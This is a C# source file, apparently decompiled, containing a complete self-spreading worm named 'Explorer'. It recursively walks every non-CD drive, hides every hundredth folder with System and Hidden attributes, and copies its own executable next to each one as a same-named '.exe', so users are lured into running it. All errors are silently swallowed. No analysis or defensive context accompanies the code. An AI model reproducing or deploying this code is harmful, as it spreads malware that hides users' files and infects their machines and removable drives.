using System.IO;
using System.Windows.Forms;

namespace Explorer;

internal class Class0
{
	private static long long_0 = 0L;

	private static string string_0 = Application.get_ExecutablePath();

	public static void smethod_0()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		int num = drives.Length;
		for (int i = 0; i < num; i++)
		{
			if (!drives[i].IsReady || !(drives[i].DriveType.ToString() != "CDRom"))
			{
				continue;
			}
			try
			{
				string[] directories = Directory.GetDirectories(drives[i].Name);
				int num2 = directories.Length;
				for (int j = 0; j < num2; j++)
				{
					try
					{
						Application.DoEvents();
						smethod_1(directories[j]);
						string string_ = directories[j];
						long_0++;
						smethod_2(ref string_);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}

	private static void smethod_1(string string_1)
	{
		string[] directories = Directory.GetDirectories(string_1);
		int num = directories.Length;
		for (int i = 0; i < num; i++)
		{
			try
			{
				Application.DoEvents();
				smethod_1(directories[i]);
				string string_2 = directories[i];
				long_0++;
				smethod_2(ref string_2);
			}
			catch
			{
			}
		}
	}

	private static void smethod_2(ref string string_1)
	{
		long_0 = ((long_0 > 100L) ? 0L : long_0);
		if (long_0 != 100L)
		{
			return;
		}
		try
		{
			if (!File.Exists(string_1 + ".exe"))
			{
				FileInfo fileInfo = new FileInfo(string_1);
				fileInfo.Attributes = fileInfo.Attributes | FileAttributes.System | FileAttributes.Hidden;
				File.Copy(string_0, string_1 + ".exe", overwrite: true);
				FileInfo fileInfo2 = new FileInfo(string_1 + ".exe");
				fileInfo2.Attributes = fileInfo2.Attributes & FileAttributes.System & FileAttributes.Hidden;
			}
		}
		catch
		{
			long_0 = 50L;
		}
	}
}
